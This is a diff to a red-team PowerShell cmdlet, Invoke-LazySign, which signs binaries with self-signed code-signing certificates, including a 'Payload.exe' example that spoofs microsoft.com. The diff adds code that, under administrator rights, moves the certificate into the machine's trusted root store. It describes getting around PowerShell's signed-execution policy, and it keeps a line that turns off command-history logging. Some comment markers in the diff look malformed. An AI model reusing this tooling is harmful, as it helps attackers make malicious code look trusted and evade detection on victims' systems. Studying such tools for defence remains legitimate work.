@@ -6,21 +6,25 @@
    AddaptedFrom: @JeanMaes {Invoke-LazySign}
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: PSVersion 3 {native?}
-   Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   Optional Dependencies: Administrator privs
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    This cmdlet allow users to sign windows binarys or scripts
    on windows certificate store without the need of admin privs.
+   This action allow us to exec cmdlets later, even if powershell
+   ExecutionPolicy its set to 'AllSigned,RemoteSigned' restrictions
 
 .NOTES
-   This cmdlet uses 'Cert:\CurrentUser\My' store to create certs
+   This cmdlet uses 'Cert:\CurrentUser\My' store to create certs,
+   Unless cmdlet its execute with administrator privileges. In that
+   ocassion it exports the certificate to 'Cert:\LocalMachine\Root'.
 
 .Parameter Action
    Accepts arguments: query, sign (default: query)
 
 .Parameter Target
-   The Script\PE to sign (default: off)
+   The Windows binary\Cmdlet to sign (default: off)
 
 .Parameter FriendlyName
    Certificate Friendly Name (default: SsaRedTeam)
@@ -36,11 +40,11 @@
 
 .EXAMPLE
    PS C:\> .\Invoke-LazySign.ps1 -Action "query" -Subject "[a-z 0-9]"
-   Query for ALL certificates in 'Cert:\CurrentUser\My' Windows Store
+   Query for ALL certificates in 'Cert:\CurrentUser\My | Root' Store
 
 .EXAMPLE
    PS C:\> .\Invoke-LazySign.ps1 -Action "query" -Subject "LazySign"
-   Query for ALL 'LazySign-????' certs in 'Cert:\CurrentUser\My' Store
+   Query for ALL 'LazySign' certs in 'Cert:\CurrentUser\My | Root' Store
 
 .EXAMPLE
    PS C:\> .\Invoke-LazySign.ps1 -Subject "LazySign" -Target "$pwd\Payload.exe" -Domain "microsoft.com"
@@ -70,6 +74,7 @@
 
 .LINK
    https://github.com/jfmaes/LazySign
+   https://sid-500.com/2017/10/26/how-to-digitally-sign-powershell-scripts
 #>
 
 
@@ -83,10 +88,10 @@
 )
 
 
-$CmdletVersion = "v1.0.1"
+$CmdletVersion = "v1.0.2"
 #Global variable declarations
 $StoreLocation = "Cert:\CurrentUser\My"
-$ErrorActionPreference = "SilentlyContinue"
+# $ErrorActionPreference = "SilentlyContinue"
 #Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@Invoke-LazySign $CmdletVersion {SSA@RedTeam}"
@@ -108,6 +113,12 @@ If(-not(Test-Path -Path "$StoreLocation"))
    return
 }
 
+#Supported locations
+$LocationsList = @(
+   "Cert:\CurrentUser\My",
+   "Cert:\LocalMachine\Root"
+)
+
 
 If($Action -ieq "query")
 {
@@ -118,18 +129,18 @@ If($Action -ieq "query")
       Helper - Query for certificate existance in store.
 
    .OUTPUTS
-      * Manage Windows Store Certificates.
-        + Store Location: Cert:\CurrentUser\My
+   * Manage Windows Store Certificates.
+     + Store Location: Cert:\CurrentUser\My
 
-      FriendlyName :
-      Subject      : CN=30a40d0a-1b17-4ba5-bf56-999351b0b923
-      Issuer       : DC=net + DC=windows + CN=MS-Organization-Access + OU=82dbaca4-3e81-46ca-9c73-0950c1eaca97
-      PublicKey    : System.Security.Cryptography.X509Certificates.PublicKey
-      PrivateKey   :
-      NotAfter     : 21/06/2031 17:54:44
-      NotBefore    : 21/06/2021 17:24:44
+   FriendlyName : Sectigo (AddTrust)
+   Subject      : CN=AddTrust External CA Root, OU=AddTrust External TTP Network, O=AddTrust AB, C=SE
+   Issuer       : CN=AddTrust External CA Root, OU=AddTrust External TTP Network, O=AddTrust AB, C=SE
+   PSParentPath : Microsoft.PowerShell.Security\Certificate::LocalMachine\Root
+   PublicKey    : System.Security.Cryptography.X509Certificates.PublicKey
+   NotAfter     : 30/05/2020 11:48:38
+   NotBefore    : 30/05/2000 11:48:38
 
-      * Exit Invoke-LazySign cmdlet [ok]..    
+   * Exit Invoke-LazySign cmdlet [ok]..   
    #>
 
    write-host "  + " -ForegroundColor DarkYellow -NoNewline
@@ -137,14 +148,17 @@ If($Action -ieq "query")
    write-host "$StoreLocation" -ForegroundColor DarkYellow
 
    #Query certlm.msc for certificate existance - 30a40d0a
-   $checkMe = Get-ChildItem $StoreLocation | Where-Object {
-      $_.Issuer -iMatch "$Subject" -or $_.Subject -iMatch "^(CN=$Subject)"
-   }| Select-Object FriendlyName,Subject,Issuer,PublicKey,PrivateKey,NotAfter,NotBefore |
-   Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 2 | Format-List
+   ForEach($SetLocation in $LocationsList)
+   {
+      $checkMe = Get-ChildItem $SetLocation | Where-Object {
+         $_.Issuer -iMatch "$Subject" -or $_.Subject -iMatch "^(CN=$Subject)"
+      }| Select-Object FriendlyName,Subject,Issuer,PSParentPath,PublicKey,NotAfter,NotBefore |
+      Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 2 | Format-List
+   }
 
    If(-not($checkMe) -or $checkMe -eq $null)
    {
-      write-host "`n  x Error: none certificates found that match criteria.`n" -ForegroundColor Red -BackgroundColor Black
+      write-host "`n  x Error: none '$Subject' certificates found..`n" -ForegroundColor Red -BackgroundColor Black
       write-host "* Exit Invoke-LazySign cmdlet [" -ForegroundColor Green -NoNewline
       write-host "ok" -ForegroundColor DarkYellow -NoNewline
       write-host "].." -ForegroundColor Green
@@ -245,6 +259,7 @@ If($Action -ieq "Sign")
    write-host "  Password     : $Password`n"
    Start-Sleep -Seconds 1
 
+   < #
    #Create Self Signed Certificate and PFX file in current directory
    $Certificate = New-SelfSignedCertificate -Subject "$RandSubject" -FriendlyName "$FriendlyName" -CertStoreLocation "$StoreLocation" -DnsName "$Domain" -Type "CodeSigning" -ErrorAction SilentlyContinue  
    Export-PfxCertificate -FilePath "$CertPath" -Password "$SecurePassword" -Cert "$Certificate" -ErrorAction SilentlyContinue
@@ -260,15 +275,34 @@ If($Action -ieq "Sign")
        return
    }
 
+   $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
+   If($bool)
+   {
+      <#
+      .SYNOPSIS
+         Author: @r00t-3xp10it
+         Helper - Move certificate to 'Cert:\LocalMachine\Root'
+      #>
+
+      $TestExistence = (Get-ChildItem "Cert:\CurrentUser\My"|?{$_.Issuer -iMatch "$Subject" -or $_.Subject -iMatch "^(CN=$Subject)"}).Subject
+      If($TestExistence)
+      {
+         Move-Item -Path $Certificate.PSPath -Destination "Cert:\LocalMachine\Root"
+      }
+   }
+
    #Sign our Windows binary\cmdlet with a self-signed certificate
    Set-AuthenticodeSignature -Certificate "$Certificate" -Filepath "$Target" –TimestampServer "http://timestamp.comodoca.com/authenticode"
    If(Test-Path -Path "$CertPath"){Remove-Item -Path "$CertPath" -Force}
 
    #Display query store settings - 30a40d0a
-   Get-ChildItem $StoreLocation | Where-Object {
-      $_.Issuer -iMatch "$Subject" -or $_.Subject -iMatch "^(CN=$Subject)"
-   }| Select-Object Thumbprint,Subject | Format-Table -AutoSize
-
+   ForEach($SetLocation in $LocationsList)
+   {
+      Get-ChildItem $SetLocation | Where-Object {
+         $_.Issuer -iMatch "$Subject" -or $_.Subject -iMatch "^(CN=$Subject)"
+      }| Select-Object Thumbprint,Subject | Format-Table -AutoSize
+   }
+   #>
 }
 
 #CmdLet Exit
